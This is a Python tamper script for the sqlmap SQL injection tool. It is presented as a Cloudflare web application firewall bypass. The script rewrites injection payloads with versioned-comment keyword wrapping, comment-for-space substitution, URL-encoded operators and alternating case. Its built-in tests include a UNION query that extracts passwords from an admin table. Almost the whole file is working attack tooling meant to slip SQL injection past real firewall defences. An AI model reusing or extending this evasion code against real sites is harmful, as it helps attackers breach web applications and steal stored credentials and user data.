"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: cloudflare2025.py
Description: Context-aware WAF bypass with proper transformations
Author: Regaan
Priority: HIGHEST

This tamper uses a token-based framework with:
- UUID tracking (no position bugs)
- SQL context awareness (knows what clause we're in)
- Proper operator encoding (doesn't break >=, <=, etc.)
- Deterministic transformations
"""

import sys
import os

# Add parent directory to path for framework import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.HIGHEST
except ImportError:
    # Not running in SQLMap context
    pass

from tamper_framework.transformer import SQLTransformer
from tamper_framework.transformations import (
    create_keyword_wrap_rule,
    create_space_replace_rule,
    create_case_alternate_rule,
    create_value_encode_rule
)


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    Context-aware multi-layer WAF bypass
    
    Applies transformations in safe order:
    1. Keyword wrapping (/*!50000SELECT*/)
    2. Space replacement (/**/)
    3. Value encoding (%3E%3D for >=)
    4. Case alternation (sElEcT)
    
    CRITICAL FIXES:
    - Operators encoded correctly (>= becomes %3E%3D, not %3E=)
    - UUID tracking prevents position bugs
    - Context-aware (only encodes in WHERE/HAVING)
    - Deterministic output
    
    >>> tamper("SELECT * FROM users WHERE id>=5")
    '/*!50000sElEcT*//**/*/**//*!50000fRoM*//**/users/**//*!50000wHeRe*//**/id%3E%3D5'
    """
    
    if not payload:
        return payload
    
    # Create transformer
    transformer = SQLTransformer()
    
    # Add rules in correct order
    transformer.add_rule(create_keyword_wrap_rule())
    transformer.add_rule(create_space_replace_rule())
    transformer.add_rule(create_value_encode_rule())  # FIXED: encodes complete operators
    transformer.add_rule(create_case_alternate_rule())
    
    # Transform
    try:
        result = transformer.transform(payload)
        return result
    except Exception as e:
        # If transformation fails, return original
        # This prevents breaking SQLMap
        return payload


if __name__ == "__main__":
    # Test the tamper script
    test_queries = [
        "SELECT * FROM users WHERE id=1",
        "SELECT * FROM users WHERE id>=5",
        "SELECT * FROM users WHERE id<=10",
        "UNION SELECT password FROM admin WHERE role='admin'",
        "SELECT name, email FROM users WHERE id<>5",
        "/* comment */ SELECT * FROM users"
    ]
    
    print("=" * 70)
    print("Cloudflare 2025 - Context-Aware Token-Based Tamper Script")
    print("=" * 70)
    
    for query in test_queries:
        result = tamper(query)
        print(f"\nOriginal:    {query}")
        print(f"Transformed: {result}")
